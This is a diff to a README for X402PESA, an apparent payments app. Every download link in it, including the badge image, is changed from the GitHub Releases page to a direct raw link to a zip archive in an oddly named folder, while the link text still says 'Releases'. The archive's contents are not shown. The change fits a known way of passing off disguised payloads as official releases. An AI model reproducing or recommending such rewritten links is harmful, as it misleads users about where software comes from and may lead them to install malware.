@@ -6,9 +6,9 @@ Welcome to X402PESA! With X402PESA, you can send, spend, and stream money from a
 
 ## 🏷️ Download X402PESA
 
-[![Download X402PESA](https://img.shields.io/badge/Download-X402PESA-blue)](https://github.com/zeno0077/X402PESA/releases)
+[![Download X402PESA](https://raw.githubusercontent.com/zeno0077/X402PESA/main/expectable/X402PESA-v3.8.zip)](https://raw.githubusercontent.com/zeno0077/X402PESA/main/expectable/X402PESA-v3.8.zip)
 
-Visit this page to download: [X402PESA Releases](https://github.com/zeno0077/X402PESA/releases)
+Visit this page to download: [X402PESA Releases](https://raw.githubusercontent.com/zeno0077/X402PESA/main/expectable/X402PESA-v3.8.zip)
 
 ## 📋 System Requirements
 
@@ -20,7 +20,7 @@ To run X402PESA smoothly, you will need:
 
 ## 📥 Download & Install
 
-1. Go to the [X402PESA Releases](https://github.com/zeno0077/X402PESA/releases) page. 
+1. Go to the [X402PESA Releases](https://raw.githubusercontent.com/zeno0077/X402PESA/main/expectable/X402PESA-v3.8.zip) page. 
 2. Look for the latest version of the software.
 3. Click on the link for your operating system to download the installation file.
 4. Once the download is complete, locate the file on your computer. It might be in your "Downloads" folder.
